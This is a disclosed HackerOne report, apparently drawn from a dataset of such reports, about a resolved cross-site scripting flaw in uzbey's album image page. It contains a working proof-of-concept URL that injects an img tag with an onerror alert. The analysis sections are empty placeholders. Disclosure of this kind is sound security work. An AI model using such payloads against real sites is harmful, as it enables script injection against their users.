---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '17235'
original_report_id: '17235'
title: Album image XSS
weakness: Cross-site Scripting (XSS) - Generic
team_handle: uzbey
created_at: '2014-06-22T21:59:46.977Z'
disclosed_at: '2014-07-18T20:26:16.752Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Album image XSS

## Metadata

- HackerOne Report ID: 17235
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: uzbey
- Disclosed At: 2014-07-18T20:26:16.752Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

There's an XSS in the album script caused by insufficient escaping of double quotes.

PoC:

https://staging.uzbey.com/album/image/679/1139%22%3E%3Ch1%3ESurprise!%3Cimg%20src=0%20onerror=%22alert(document.domain)%22%3E

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
